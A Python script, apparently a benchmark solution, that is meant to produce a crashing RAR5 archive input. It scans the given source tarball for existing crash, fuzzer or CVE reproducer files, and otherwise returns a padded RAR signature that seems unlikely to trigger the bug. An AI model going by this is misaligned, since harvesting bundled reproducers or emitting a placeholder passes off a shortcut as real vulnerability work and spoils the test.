import os
import tarfile


class Solution:
    def solve(self, src_path: str) -> bytes:
        def member_score(m: tarfile.TarInfo) -> int:
            name = m.name
            name_l = name.lower()
            ext = os.path.splitext(name_l)[1]

            score = 0
            if ext == ".rar":
                score += 50
            elif "rar" in ext:
                score += 20

            if "rar" in name_l:
                score += 10
            if "rar5" in name_l or "rar_5" in name_l or "rar-5" in name_l:
                score += 15

            patterns = [
                ("poc", 30),
                ("crash", 25),
                ("clusterfuzz", 25),
                ("huff", 15),
                ("huffman", 20),
                ("overflow", 20),
                ("overrun", 15),
                ("fuzz", 10),
                ("asan", 10),
                ("ubsan", 10),
                ("bug", 10),
                ("cve", 20),
            ]
            for pat, val in patterns:
                if pat in name_l:
                    score += val

            if ext in (".bin", ".dat", ".raw"):
                score += 5

            return score

        try:
            with tarfile.open(src_path, "r:*") as tf:
                exact = []
                others = []

                for m in tf.getmembers():
                    if not m.isfile():
                        continue
                    size = m.size
                    if size <= 0 or size > 10 * 1024 * 1024:
                        continue

                    s = member_score(m)
                    closeness = abs(size - 524)
                    record = (s, closeness, size, m)

                    if size == 524:
                        exact.append(record)
                    else:
                        others.append(record)

                chosen_member = None

                if exact:
                    exact.sort(key=lambda t: (-t[0], t[1], t[2], t[3].name))
                    chosen_member = exact[0][3]
                elif others:
                    others.sort(key=lambda t: (-t[0], t[1], t[2], t[3].name))
                    chosen_member = others[0][3]

                if chosen_member is not None:
                    try:
                        f = tf.extractfile(chosen_member)
                        if f is not None:
                            data = f.read()
                            if isinstance(data, bytes) and data:
                                return data
                    except Exception:
                        pass
        except Exception:
            pass

        return self._fallback_poc()

    def _fallback_poc(self) -> bytes:
        header = bytearray(b"Rar!\x1a\x07\x01\x00")
        pattern = b"\x00\xff\x00\xff" * 50
        header.extend(pattern)

        desired_len = 524
        if len(header) < desired_len:
            header.extend(b"A" * (desired_len - len(header)))
        else:
            header = header[:desired_len]

        return bytes(header)